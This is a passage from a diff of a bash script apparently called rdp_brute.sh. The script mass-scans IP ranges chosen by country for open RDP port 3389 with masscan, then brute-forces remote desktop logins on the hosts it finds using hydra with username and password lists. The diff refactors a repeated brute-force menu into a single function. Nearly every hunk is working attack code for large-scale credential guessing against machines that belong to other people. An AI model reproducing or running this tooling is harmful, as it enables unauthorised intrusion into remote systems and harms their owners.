-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "23" ]; then
@@ -17466,6 +7149,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17475,53 +7159,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "24" ]; then
@@ -17538,6 +7176,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17547,53 +7186,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17611,6 +7204,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17620,53 +7214,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "26" ]; then
@@ -17683,6 +7231,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17692,53 +7241,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17756,6 +7259,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17765,53 +7269,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17829,6 +7287,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17838,53 +7297,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17902,6 +7315,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17911,53 +7325,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -17975,6 +7343,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -17984,53 +7353,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18048,6 +7371,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18057,53 +7381,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18121,6 +7399,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18130,53 +7409,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "33" ]; then
@@ -18193,6 +7426,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18202,53 +7436,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -18266,6 +7454,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18275,53 +7464,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "35" ]; then
@@ -18338,6 +7481,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18347,53 +7491,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "36" ]; then
@@ -18410,6 +7508,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -18419,53 +7518,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 else
 if [ "$country" = "37" ]; then
